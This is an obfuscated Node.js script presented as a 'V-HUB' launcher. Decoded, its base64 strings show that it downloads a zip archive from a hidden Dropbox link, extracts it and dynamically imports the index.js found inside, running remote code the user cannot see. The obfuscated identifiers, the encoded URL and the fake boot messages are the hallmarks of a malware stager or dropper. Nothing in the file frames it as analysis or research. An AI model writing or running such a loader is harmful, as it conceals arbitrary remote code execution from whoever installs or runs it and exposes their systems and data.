import https from 'https';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import AdmZip from 'adm-zip';
import fetch from 'node-fetch';

const _0x1d4a=(_0x2b3c)=>Buffer.from(_0x2b3c,'base64').toString('utf-8');
const _0x9f2e=(_0x4a1b)=>console.log(_0x1d4a(_0x4a1b));
const _0x7c8d={_v:"aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL3Ezang0cXdyY21qM2EyNGRneDU1bC92aHViX2NvcmUuemlwP3Jsa2V5PWVzYzAybzAwNXY0Nmh1ZTN3bTdoZ2dkc3kmc3Q9YjE1em8xZmsmZGw9MQ==", _5:"aW5kZXguanM=", _8:"Y29yZS56aXA=", _9:"aHViX3RlbXA="};
const _0x5b6f=async(_0x3e1a,_0x8d2c)=>{const _0x6f4b=await fetch(_0x3e1a,{redirect:_0x1d4a('Zm9sbG93')});if(!_0x6f4b.ok)throw new Error(_0x1d4a('RG93bmxvYWQgZmFpbGVkOg==')+' '+_0x6f4b.statusText);fs.writeFileSync(_0x8d2c,Buffer.from(await _0x6f4b.arrayBuffer()));};
const _0x2a9e=(_0x1c3d)=>{const _0x4e5f=fs.readdirSync(_0x1c3d);const _0x7b8a=_0x1d4a(_0x7c8d._5);if(_0x4e5f.includes(_0x7b8a))return path.join(_0x1c3d,_0x7b8a);for(const _0x9d1c of _0x4e5f){const _0x3f2e=path.join(_0x1c3d,_0x9d1c);if(fs.statSync(_0x3f2e).isDirectory()){const _0x8a7b=_0x2a9e(_0x3f2e);if(_0x8a7b)return _0x8a7b;}}return null;};
(async()=>{_0x9f2e('W1YtSFVCXSBTWVNURU0gU1RBUFRJTkcuLi4=');try{const _0x1e2f=path.join(process.cwd(),_0x1d4a(_0x7c8d._8));const _0x3a4b=path.join(process.cwd(),_0x1d4a(_0x7c8d._9));if(!fs.existsSync(_0x3a4b))fs.mkdirSync(_0x3a4b,{recursive:!0});_0x9f2e('W1YtSFVCXSBGRVRDSElORyBDT1JFLi4u');await _0x5b6f(_0x1d4a(_0x7c8d._v),_0x1e2f);_0x9f2e('W1YtSFVCXSBFWFRSQUNUSU5HLi4u');new AdmZip(_0x1e2f).extractAllTo(_0x3a4b,!0);fs.unlinkSync(_0x1e2f);const _0x8f9d=_0x2a9e(_0x3a4b);if(!_0x8f9d)throw new Error(_0x1d4a('Q291bGQgbm90IGxvY2F0ZSBpbmRleC5qcyBpbnNpZGUgWklQ'));console.log(_0x1d4a('W1YtSFVCXSBCT09USU5HIEZST006IA==')+_0x8f9d);process.chdir(path.dirname(_0x8f9d));await import(`file://${_0x8f9d}`);}catch(_0x5c6a){console.error(_0x1d4a('W1YtSFVCXSBGQVRBTCBFUlJPUjo='),_0x5c6a.message);process.exit(1);}})();
